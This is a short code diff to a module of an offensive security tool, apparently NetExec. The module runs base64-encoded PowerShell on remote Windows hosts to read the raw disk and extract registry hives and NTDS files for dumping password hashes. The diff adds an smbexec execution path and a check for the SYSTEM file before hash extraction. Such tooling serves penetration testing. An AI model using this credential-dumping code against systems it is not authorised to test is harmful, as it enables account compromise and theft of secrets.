@@ -115,8 +115,10 @@ class NXCModule:
         # scary base64 powershell code :)
         # This to read the PhysicalDrive0 file
         get_data_script = f"""powershell.exe -c "$base64Cmd = '{self.ps_script_b64}';$decodedCmd = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($base64Cmd)) + '; read_disk {offset} {fixed_size}'; Invoke-Expression $decodedCmd" """
-        if self.connection.__class__.__name__ == "wmi":  # noqa: SIM108
+        if self.connection.__class__.__name__ == "wmi":
             data_output = self.connection.execute_psh(get_data_script, True)
+        elif self.connection.__class__.__name__ == "smb":
+            data_output = self.execute(get_data_script, True, ["smbexec"])
         else:
             data_output = self.execute(get_data_script, True)
         self.logger.debug(f"{offset=},{size=},{fixed_size=}")
@@ -174,8 +176,11 @@ class NXCModule:
         if self.number_of_file_to_extract != 0:
             self.logger.fail("Unable to find all needed files, trying to work with what we have")
 
-        self.logger.success("Heads up, hashes on the way...")
-        self.dump_hashes()
+        if "SYSTEM" in self.extracted_files_location_local and self.extracted_files_location_local["SYSTEM"] != "":
+            self.logger.success("Heads up, hashes on the way...")
+            self.dump_hashes()
+        else:
+            self.logger.fail("SYSTEM file not found, unable to proceed with hash extraction")
 
     def dump_hashes(self):
         """Dumping NTDS and SAM hashes locally from the extracted files"""
